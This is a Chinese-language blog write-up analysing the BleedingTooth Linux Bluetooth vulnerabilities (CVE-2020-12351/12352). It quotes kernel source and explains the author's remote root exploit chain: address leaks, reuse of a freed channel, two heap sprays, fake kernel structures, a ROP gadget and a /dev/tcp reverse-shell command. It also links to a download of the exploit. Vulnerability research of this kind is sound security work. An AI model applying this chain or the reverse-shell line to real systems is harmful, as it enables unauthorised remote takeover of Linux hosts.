---
layout: post
title:  "Bleeding Tooth：Linux蓝牙驱动远程代码执行分析与利用"
date:   2021-05-27 13:27:38 +0800
category: linux_kernel
---
这是我分析 Bleeding Tooth 系列漏洞的第二篇，原文发布在看雪论坛 [[原创]Bleeding Tooth：Linux蓝牙驱动远程代码执行分析与利用](https://bbs.kanxue.com/thread-267845.htm) 。 Bleeding Tooth 是 Linux 内核蓝牙协议栈的两个漏洞 CVE-2020-12351 、CVE-2020-12352，这两个漏洞可以造成 Linux 系统被攻击者获取远程 root shell，具有被开发成近源攻击武器的潜力。我在对漏洞的分析和理解的基础上，开发出了获取远程root shell的漏洞利用代码，并且做了实机的演示。从现在的眼光来看当时的这个漏洞，我认为这个漏洞的成因还是很复杂的，它并不是单纯的缓冲区溢出漏洞或者是 UAF 漏洞，而是一种基于对象类型的混淆而产生的越界写漏洞，而且该漏洞的利用也是较为复杂的，涉及到多次堆喷射。对于当时还是初学者的我而言，分析这个漏洞的难度还是很大的，但最终还是被我啃了下来。还是毛主席的那句话：“世上无难事，只要肯登攀”！

# **一、原理**

利用Bleeding Tooth系列漏洞的CVE-2020-12351和CVE-2020-12352实现远程代码执行，可以获取远程root shell。其中CVE-2020-12352泄漏位于内核代码段和内核堆上的地址，CVE-2020-12351利用越界读控制程序流。攻击机和目标的环境都是Ubuntu20.04.1，内核版本都是5.4.0-42。

在上一篇分析中简要介绍了蓝牙协议栈结构，这两个漏洞涉及到蓝牙异步通信中的L2CAP协议、A2MP协议和和信道控制协议。

![图 1-1 蓝牙异步通信架构](https://bbs.kanxue.com/upload/attach/202105/741085_HPHZ8SF8TRJYJEM.jpg)

L2CAP相当于网络协议中的TCP、UDP层，负责用户数据的分段与重组、传输质量控制、底层连接的复用。

信道控制协议用于通信的双方协商L2CAP参数。

# **二、CVE-2020-12352栈变量泄漏**

该漏洞是漏洞发现者在遍历a2mp_send( )调用位置的时候发现的。

```c
//代码2-1  linux-5.4\net\bluetooth\a2mp.c
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,  struct a2mp_cmd *hdr)
{
    struct a2mp_info_req *req  = (void *) skb->data;
    struct hci_dev *hdev;
 
    hdev = hci_dev_get(req->id);
    if (!hdev || hdev->dev_type != HCI_AMP) {
        struct a2mp_info_rsp rsp;    //栈变量未初始化
 
        rsp.id = req->id;
        rsp.status = A2MP_STATUS_INVALID_CTRL_ID;
        a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
              &rsp);
 
    }
```

a2mp_getinfo_req处理请求包并返回结果，当hdev不存在或者dev_type检查不通过就发送错误信息rsp，可以看到这里仅仅设置了id和status字段，实际上a2mp_info_rsp的结构如下：

![图 2-1 a2mp_info_rsp结构](https://bbs.kanxue.com/upload/attach/202105/741085_FFDYKZSJM9JEKNM.png)

剩下16字节内容就是前一个栈遗留下来的数据，由于rsp没有将这些字段初始化，因此攻击者可以获得保存在栈上的16字节数据。幸运的是经过测试发现不需要额外的前序步骤就可以泄漏一个内核代码段地址。

# **三、CVE-2020-12351从越界读到程序流劫持**

上一篇文章已经详细介绍了这个漏洞，HCI层接收全部的数据分组后将数据交由L2CAP层处理，l2cap_data_channel根据cid参数找到对应的channel，将L2CAP载荷交给channel。这里的cid相当于TCP/UDP里面的端口，channel则与调用蓝牙的进程关联，作用是将数据交给对应的进程。

```c
//代码3-1  linux-5.4\net\bluetooth\l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid, struct sk_buff *skb)
{
    struct l2cap_chan *chan;
    chan = l2cap_get_chan_by_scid(conn, cid);        //寻找对应的进程
    if (!chan) {
        if (cid == L2CAP_CID_A2MP) {
            chan = a2mp_channel_create(conn, skb);   
            ……
        }
    }
    ……
    switch (chan->mode) {
    ……
 
    case L2CAP_MODE_ERTM:           
    case L2CAP_MODE_STREAMING:
        l2cap_data_rcv(chan, skb);
        goto done;
     }
```

问题出在l2cap_data_rcv中调用的sk_filter函数，当cid=L2CAP_CID_A2MP(3)时，实际传入sk_filter的是指向struct amp_mgr结构的指针。

```c
//代码3-2  linux-5.4\net\bluetooth\l2cap_core.c
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
    if ((chan->mode == L2CAP_MODE_ERTM || chan->mode == L2CAP_MODE_STREAMING)
        && sk_filter(chan->data,    skb))
```

而sk_filter接收的第一个参数应该是指向struct sock结构的指针。

```c
//代码3-3  linux-5.4\include\linux\filter.h
static inline int sk_filter(struct sock *sk, struct sk_buff *skb)
{
    return sk_filter_trim_cap(sk, skb, 1);
}
```

当cid=L2CAP_CID_A2MP(3)时，l2cap_data_channel创建一个新的channel。

```c
//代码3-4  linux-5.4\net\bluetooth\a2mp.c
struct l2cap_chan *a2mp_channel_create(struct l2cap_conn *conn, struct sk_buff *skb)
{
    struct amp_mgr *mgr;
    ……
    mgr = amp_mgr_create(conn, false);
    ……
    return mgr->a2mp_chan;
}
```

chan->data是指向struct amp_mgr结构的指针，chan被作为参数传递给了sk_filter，后续过程中将struct amp_mgr当作struct sock来解析。

```c
//代码3-5  linux-5.4\net\bluetooth\a2mp.c
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
    struct amp_mgr *mgr;
    struct l2cap_chan *chan;
 
    mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
    ……
    chan = a2mp_chan_open(conn, locked);
 
    mgr->a2mp_chan = chan;
    chan->data = mgr;    //struct amp_mgr *
    ……
    return mgr;
}
```

sk_filter调用sk_filter_trim_cap读取sk->sk_filter保存到filter指针。

```c
//代码3-6  linux-5.4\net\core\filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
    struct sk_filter *filter;
 
    rcu_read_lock();
    filter = rcu_dereference(sk->sk_filter);
    if (filter) {
        ……
        pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
    ……
}
```

struct sock结构大小为0x2f8（760字节），sk_filter的偏移为0x110。

![图 3-1 sock结构](https://bbs.kanxue.com/upload/attach/202105/741085_MEY4NZTW6TMJGS6.png)

实际传入的struct amp_mgr结构大小为0x70（112字节），按照0x110的偏移去访问sk_filter显然已经越界，内核崩溃就在这个地方。

![图 3-2 amp_mgr结构](https://bbs.kanxue.com/upload/attach/202105/741085_KQ35R9PR3QFR7AB.png)

![图 3-3 sk_filter_trim_cap反汇编](https://bbs.kanxue.com/upload/attach/202105/741085_V54N6BP4HUNYU8K.png)

RDI寄存器保存sk_filter第一个参数，rdi+0x110为sk_filter，值为0x4343434343434343，保存在rax寄存器。

![图 3-4 故障现场](https://bbs.kanxue.com/upload/attach/202105/741085_HEE4QMQEY8YHBZW.png)

如何从越界读到程序流劫持？代码sk_filter_trim_cap调用了bpf_prog_run_save_cb，第一个参数为sk->sk_filter->prog

```c
//代码3-7  linux-5.4\include\linux\filter.h
static inline u32 bpf_prog_run_save_cb(const struct bpf_prog *prog, struct sk_buff *skb)
{
    u32 res;
 
    preempt_disable();
    res = __bpf_prog_run_save_cb(prog, skb);
    preempt_enable();
    return res;
}
```

继而又调用了BPF_PROG_RUN，参数不变。

```c
//代码3-8  linux-5.4\include\linux\filter.h
static inline u32 __bpf_prog_run_save_cb(const struct bpf_prog *prog, struct sk_buff *skb)
{
    ……
    res = BPF_PROG_RUN(prog, skb);
    ……
    return res;
}
```

最后调用了prog->bpf_func函数指针，并且第二个参数是prog->insnsi。

```c
//代码3-9 linux-5.4\include\linux\filter.h
#define BPF_PROG_RUN(prog, ctx)    ({            \
    u32 ret;                            \
    cant_sleep();                        \
    if (static_branch_unlikely(&bpf_stats_enabled_key)) {    \
        ……            \
        ret = (*(prog)->bpf_func)(ctx, (prog)->insnsi);    \
        ……        \
    } else {                            \
        ret = (*(prog)->bpf_func)(ctx, (prog)->insnsi);    \
    }                            \
    ret; })
```

bpf_func在bpf_prog结构中偏移0x30的位置，prog->insnsi保存最后一个字节结束地址。

![图 3-5 sk_filter和bpf_prog结构](https://bbs.kanxue.com/upload/attach/202105/741085_35MAKJG7C8K3XXS.jpg)

整个调用链条是sk->sk_filter->prog->bpf_func，因此如果能控制sk_filter指向一块攻击者控制的区域，在其中布置伪造的sk_filter、bpf_prog和ROP链就可以劫持程序流。

![](https://bbs.kanxue.com/upload/attach/202105/741085_GYEUKVG6WF3S6BX.jpg)

向sk_filter传入指向struct amp_mgr的指针，通过堆喷射在后续堆块中sk->sk_filter的位置写入指向fake sk_filter的指针，prog指向fake bpf_prog，bpf_func指向rop gadget用于将内核栈劫持到rop chains的位置，如此便可以触发rop链劫持程序流。

# **四、构造目标和数据流**

远程代码执行须具备以下三个条件：

1、控制一个已知地址的堆块或栈空间以存放shellcode或者rop链；

2、泄漏代码段地址以构造rop链；

3、得到一次控制RIP寄存器的机会以劫持程序流。

以下内容围绕上述三个目标分析构造。

蓝牙控制器接收到空中数据解码成原始数据包，打包成HCI数据包通过数据总线如USB、PCI、RS232传递给蓝牙主机，由蓝牙驱动的hci_rx_work线程负责接收HCI数据包，传递给hci_acldata_packet解析出ACL原始数据包，l2cap_recv_acldata收集ACL数据分组将其重组成L2CAP数据包交给l2cap_recv_frame，根据l2cap包头的cid字段将l2cap载荷交给具体的进程。需要注意的是，cid=1表示该l2cap包为信道控制包，交给l2cap_sig_channel解析并执行命令。cid=3表示该l2cap包为A2MP包，不与任何进程关联。

![图 4-1 数据流](https://bbs.kanxue.com/upload/attach/202105/741085_XG98FKNQQBW92Y2.jpg)

l2cap_data_channel根据cid找到对应的channel，根据chan->mode字段选择调用a2mp_chan_recv_cb或者l2cap_data_rcv，前者引发了栈变量泄漏，后者引发了程序流劫持。

```c
//代码4-1  linux-5.4\net\bluetooth\a2mp.c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
    chan = l2cap_chan_create();
    ……
    chan->ops = &a2mp_chan_ops;            //进程拥有的操作方法
    ……
    chan->mode = L2CAP_MODE_ERTM;            //chan->mode初始化为ERTM模式   
    return chan;
}
```

cid=3创建的chan->mode为ERTM模式，因此泄漏栈变量首先要用cid=1的信道控制包将目标机的a2mp channel设置为BASIC模式。

# **五、泄漏内核代码段地址**

栈指针泄漏位于函数a2mp_getinfo_req( )，调用路径为a2mp_chan_recv_cb —> a2mp_getinfo_req( )，构造如下结构数据包，其中info_req.info_req.id设置为一个不存在的设备id即可使目标机中代码2-1的hci_dev_get( )返回NULL，而将未初始化的rsp返回给攻击者。

![图 5-1 构造漏洞数据包](https://bbs.kanxue.com/upload/attach/202105/741085_A5AQZBQCPVFE5C7.png)

实际发现rsp这块内存之前保存了两个位于内核代码段的地址，第一个长字的低2字节被设置为0x42和0x01，第二个长字则原封不动包含在rsp里面被返回给攻击者。

![图 5-2](https://bbs.kanxue.com/upload/attach/202105/741085_QRAGQ8ZM7QX62MK.png)

攻击者拿到响应数据后解析出rsp+0x8即为内核代码段地址。低端对齐后减去0xffff_ffff_8100_0000得到KASLR偏移，该偏移用于计算后续rop gadget的实际地址。

![图5-3 栈变量泄漏](https://bbs.kanxue.com/upload/attach/202105/741085_PF942V3E8HJVRQ8.png)

# **六、泄漏内核堆地址**

若在泄漏内核代码段地址之前，先发送cid=1的信道控制包试图将a2mp channel设置为ERTM模式，再次发送图5-1所示漏洞数据包，则会在rsp+0x8的位置留下一个位于内核堆区域的指针。内核将0xffff_8800_0000_0000 - 0xffff_c7ff_ffff_ffff这段虚拟地址用于物理内存直接映射，使用kmalloc分配的小块内存位于此区域。

![图 6-1 遗留的堆指针](https://bbs.kanxue.com/upload/attach/202105/741085_PCVBT55GDCTNQ2D.png)

拿到堆地址就可以根据堆块之间的相对偏移计算出任意一个堆块的地址。如果能在已知地址的堆块上布置fake sk_filter、fake bpf_prog和rop链就可以控制程序流。

这里将目标瞄准l2cap_chan结构。当cid=3会创建a2mp channel，

```c
//代码6-1  linux-5.4\net\bluetooth\l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid, struct sk_buff *skb)
{
    struct l2cap_chan *chan;
    chan = l2cap_get_chan_by_scid(conn, cid);        //寻找对应的进程
    if (!chan) {
        if (cid == L2CAP_CID_A2MP) {
            chan = a2mp_channel_create(conn, skb);   
            ……
        }
    }
```

a2mp_channel_create->amp_mgr_create->a2mp_channel_open->l2cap_chan_create，最终调用kzalloc分配堆块用于保存a2mp channel。

```c
//代码6-2 linux-5.4\net\bluetooth\l2cap_core.c
struct l2cap_chan *l2cap_chan_create(void)
{
    struct l2cap_chan *chan;
 
    chan = kzalloc(sizeof(*chan), GFP_ATOMIC);
    if (!chan)
        return NULL;
……
```

a2mp channel大小为0x318，slab系统实际分配大小为0x400的堆块。

![图 6-2 l2cap_chan结构](https://bbs.kanxue.com/upload/attach/202105/741085_59R6D8PF4XJQBMA.png)

a2mp channel地址为0xffff_8881_cdfd_d000，栈上遗留堆指针为0xffff_8881_cdfd_d110，遗留指针减去固定偏移0x110即为a2mp channel地址。

![图 6-3](https://bbs.kanxue.com/upload/attach/202105/741085_SBV7FHUZB5YNH55.png)

# **七、释放后重引用**

攻击者可以向目标机发送cid=1的信道控制包断开a2mp连接，a2mp channel会被释放。disconn_req.disconn_req.dcid=AMP_MGR_CID（3），l2cap_disconnect_req根据dcid找到要释放的channel。

![图 7-1](https://bbs.kanxue.com/upload/attach/202105/741085_GFPDYS4R4FQJ32N.png)

函数调用路径为l2cap_sig_channel -> l2cap_bredr_sig_cmd -> l2cap_disconnect_req -> l2cap_chan_put -> l2cap_chan_destroy，最终调用kfree释放a2mp channel。

```c
//代码7-1 linux-5.4\net\bluetooth\l2cap_core.c
static void l2cap_chan_destroy(struct kref *kref)
{
    struct l2cap_chan *chan = container_of(kref, struct l2cap_chan, kref);
    write_lock(&chan_list_lock);
    list_del(&chan->global_l);
    write_unlock(&chan_list_lock);
 
    kfree(chan);
}
```

现在得到一个地址已知的空闲堆块，下面获取该堆块并向里面写入fake sk_filter、fake bpf_prog和rop链。基本思路是试图在目标机中分配得到该堆块并可以向里面写入任意数据。

通过搜索堆分配函数发现了a2mp_getampassoc_rsp( )函数提供了这个功能。

```c
//代码7-2  linux-5.4\net\bluetooth\a2mp.c
static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb, struct a2mp_cmd *hdr)
{
    struct a2mp_amp_assoc_rsp *rsp = (void *) skb->data;
    u16 len = le16_to_cpu(hdr->len);       //rsp+assoc_data
    struct amp_ctrl *ctrl;
    size_t assoc_len;
 
    assoc_len = len - sizeof(*rsp);        //assoc_data长度
 
    if (rsp->status)                       //rsp->status字段保持为0
        return -EINVAL;
    ctrl = amp_ctrl_lookup(mgr, rsp->id);
    if (ctrl) {
        u8 *assoc;
        assoc = kmemdup(rsp->amp_assoc, assoc_len, GFP_KERNEL); //分配堆块
        if (!assoc) {
            amp_ctrl_put(ctrl);
            return -ENOMEM;
        }
        ctrl->assoc = assoc;
        ctrl->assoc_len = assoc_len;
        ctrl->assoc_rem_len = assoc_len;
        ctrl->assoc_len_so_far = 0;
        amp_ctrl_put(ctrl);
    }
```

调用路径为l2cap_data_channel -> a2mp_chan_recv_cb -> a2mp_getampassoc_rsp，根据图4-1可知要到达这里需要重建a2mp channel并设置channel为BASIC模式。该函数将数据包中amp_assoc部分复制到堆上。攻击机可以构造发送携带0x400字节数据的assoc_rsp数据包，有一定的概率会分配到刚释放的堆块上。

![图 7-2](https://bbs.kanxue.com/upload/attach/202105/741085_DZBTQHFFSCYWWGM.png)

代码7-2中a2mp_getampassoc_rsp调用kmemdup分配堆块必须要amp_ctrl_lookup返回有效结果。amp_ctrl_lookup在mgr->amp_ctrls链表中搜索并返回id值为rsp->id的ctrl控制结构，因此必然有一处要向mgr->amp_ctrls里面添加ctrl。

a2mp_getinfo_rsp调用amp_ctrl_add向mgr->amp_ctrls链表中添加攻击者构造的特定id的ctrl结构。调用路径为l2cap_data_channel -> a2mp_chan_recv_cb -> a2mp_getinfo_rsp。

```c
//代码7-3  linux-5.4\net\bluetooth\a2mp.c
static int a2mp_getinfo_rsp(struct amp_mgr *mgr, struct sk_buff *skb, struct a2mp_cmd *hdr)
{
    struct a2mp_info_rsp *rsp = (struct a2mp_info_rsp *) skb->data;
    struct a2mp_amp_assoc_req req;
    struct amp_ctrl *ctrl;
 
    if (rsp->status)
        return -EINVAL;
 
    ctrl = amp_ctrl_add(mgr, rsp->id);
```

攻击机发送info rsp数据包，其中info_rsp.id字段可以是任意整型值，目标机会将对应id的ctrl结构添加到链表中，a2mp_getampassoc_rsp( )就可以顺利调用kmemdup。

![图 7-3](https://bbs.kanxue.com/upload/attach/202105/741085_4V3G6AQH5Y4G97T.png)

## **1、构造堆喷射**

a2mp_getampassoc_rsp( )可以分配任意大小且内容可控的堆块，但是分配堆块的位置是不可预知的，也就是不一定分配到已知地址的堆块上。且内核堆是多线程的，无法通过排列组合构造堆布局。这种情况下可以使用堆喷射技术向堆上重复喷洒大量数据以期能够将载荷喷洒到已知地址上，最直接的做法就是分配大量的堆块并重复写入大量数据。利用a2mp_getampassoc_rsp( )分配任意大小且内容可控的特点构造堆喷射。

要注意的是ACL数据的最大传输单元为1021字节，也就是每次传输的L2CAP数据分组不超过1021字节，对于要喷射0x400（1024字节）大小的载荷需要分组传输。

![图 7-4](https://bbs.kanxue.com/upload/attach/202105/741085_HW4MXH4HH5ZSNKM.png)

若hci头部flag字段为ACL_START（2）表示hci的载荷为l2cap第一个分组。若l2cap头部len字段等于当前载荷长度，说明只有l2cap只有一个分组且被正确接收，直接交给l2cap层处理；若len字段大于当前载荷长度说明有多个l2cap分组，调用bt_skb_alloc分配缓冲区，等所有分组接收组装完毕后交给l2cap处理。

同时要注意a2mp channel缓冲区默认大小为L2CAP_DEFAULT_MIN_MTU（670字节），也就是l2cap携带的amp载荷不超过670字节。

```c
//代码7-4  linux-5.4\net\bluetooth\a2mp.c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
    struct l2cap_chan *chan;
    chan = l2cap_chan_create();
    ……
    chan->imtu = L2CAP_A2MP_DEFAULT_MTU;
    ……
```

对于喷射0x400大小的堆块，amp载荷其实不必大于670字节，因为slab会为介于512-1024之间的数据分配0x400的堆块，但是为了后面调试方便观察堆数据的布局，我们还是将0x400填满确保堆块之间没有空隙。

```c
//代码7-5 linux-5.4\net\bluetooth\l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid, struct sk_buff *skb)
{
    switch (chan->mode) {
    ……
    case L2CAP_MODE_BASIC:
        if (chan->imtu < skb->len) {    //检查amp包长度是否大于mtu
            goto drop;
        }
        if (!chan->ops->recv(chan, skb)) //调用a2mp_chan_recv_cb
            goto done;
```

为绕过AMP MTU和ACL MTU限制，要在建立a2mp channel之后紧跟着发送信道控制包（cid=1）修改AMP MTU为0xffff，并且每次发送的l2cap分组控制在ACL MTU范围内即可。

![图 7-5](https://bbs.kanxue.com/upload/attach/202105/741085_UV3ZDHR376RYANF.png)

## **2、第一次堆喷射**

向内核堆喷洒大量0x400堆块以覆盖刚刚释放的a2mp channel结构。

![图 7-6](https://bbs.kanxue.com/upload/attach/202105/741085_ZFEDBPATA992X73.png)

由于slab空闲链表遵循先进后出的原则（队列），可以看到刚刚被释放的a2mp channel又被重建的a2mp channel占用，但这个没有影响。slab不像glibc堆管理器那样，slab不使用堆块头部的元数据管理堆块，因此内核堆块之间是没有空洞的，a2mp channel + 0x400即是下一个堆块，可以看到被填充了标记字节。

由于旧的a2mp channel极有可能被再次占用，所以选择偏移0x400的位置也就是紧邻的下一个堆块保存fake bpf_prog和ROP链。

## **3、构造fake sk_filter、 bpf_prog和ROP链**

验证堆喷成功之后，将部分标记字节替换成fake sk_filter、fake bpf_prog和ROP链。

fake sk_filter位于堆块偏移0x300处，sk_filter->prog指向0xffff_8882_090d_ef20即为

![图 7-7](https://bbs.kanxue.com/upload/attach/202105/741085_MZYFYMDZEQJXEXM.png)

fake bpf_prog的起始地址。bpf_prog->bpf_func保存指向如下指令片段的地址，该地址由第5节泄漏的内核代码段地址计算而来。

```c
0xffffffff8155528d        push rsi
                          add byte ptr [rbx + 0x41], bl
                          pop rsp
                          pop rbp
                          ret
```

从sk_filter_trim_cap( )到调用bpf_func函数指针的调用路径是sk->sk_filter->prog->bpf_func(cdx, prog->insnsi)，因此调用bpf_func时，rsi寄存器保存的第二个参数 prog->insnsi指向fake bpf_prog结束后的第一个字节，也就是保存0xdeadbeef的位置。

![图 7-8 bpf_prog结构](https://bbs.kanxue.com/upload/attach/202105/741085_REBVVBBW86PCUYV.png)

所以bpf_func执行完毕后的效果就是栈指针rsp被劫持到rop链开始的位置。ROP链将内核函数run_cmd( )保存到rax寄存器，命令字符串保存到rdi作为run_cmd的参数，然后调用jmp rax执行run_cmd在用户空间以root用户身份启动一个反弹bash到公网vps。注意这里的反弹shell字符串必须是全限定的，例如“/bin/bash -c /bin/bash</dev/tcp/ip/port”。

![图7-9 ROP链](https://bbs.kanxue.com/upload/attach/202105/741085_YJ4CVHJE9FW3BM5.png)

# **八、第二次堆喷射**

攻击者成功向目标机中a2mp_chan + 0x400的位置写入了伪造数据结构和ROP链，下面就要将劫持程序流去执行ROP链。第3节分析sk_filter( )将传入的amp_mgr结构的指针当作sock结构的指针处理造成了越界读，如果在amp_mgr + 0x110的位置布置指向fake sk_filter结构的指针就可以在调用sk_filter->prog->bpf_func(cdx, prog->insnsi)的位置控制rip寄存器，进而将rsp栈指针劫持到ROP链触发任意代码执行。

amp_mgr结构大小为0x70，slab实际会分配0x80字节的堆块存放amp_mgr。

![图 8-1喷射滑板地址](https://bbs.kanxue.com/upload/attach/202105/741085_6ARD8GNJKDQBYQP.jpg)

由于喷射的堆块大小为0x80，所以每次都在堆块偏移0x10的位置布置a2mp+0x400+0x300使之指向(struct sk_filter *)fake sk_filter。

![图8-2第二次堆喷效果](https://bbs.kanxue.com/upload/attach/202105/741085_Q2DUB9M7NVRAD9T.png)

第二次堆喷射后可以看到0xffff_8882_0c9a_bc80保存着amp_mgr结构，偏移0x110处保存的sk_filter指向0xffff_8882_0f34_7f00也就是a2mp_chan + 0x700处，此处保存了fake sk_filter。

最后附上成功反弹root shell到公网vps的操作。

![图 8-3](https://bbs.kanxue.com/upload/attach/202105/741085_57H7PUR24ZGS7K2.png)

# **九、总结**

这两个漏洞能够利用成功的很重要一个原因是攻击者可以未经授权修改目标机的设置，导致了无需交互即可触发代码执行，这一点在蓝牙协议规范中并未有规定。比如攻击者直接发送信道控制包（cid=1）就可以将chan->mode字段从ERTM修改为BASIC、修改A2MP MTU和L2CAP MTU而无需目标机授权，以上正是攻击的重要步骤。

官方Exploit需要三次堆喷射，经我调试改进之后只需2次堆喷即可。

# **十、参考资料**

[1]  [BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution](https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html)

[2]《深入Linux内核架构》Wolfgang Mauerer著

[3]《BLUETOOTH SPECIFICATION Version 5.0 》

[4]  [Exploit](https://pan.baidu.com/s/1b9Zez-kRy8opubcLKxNRtw)  密码: 0610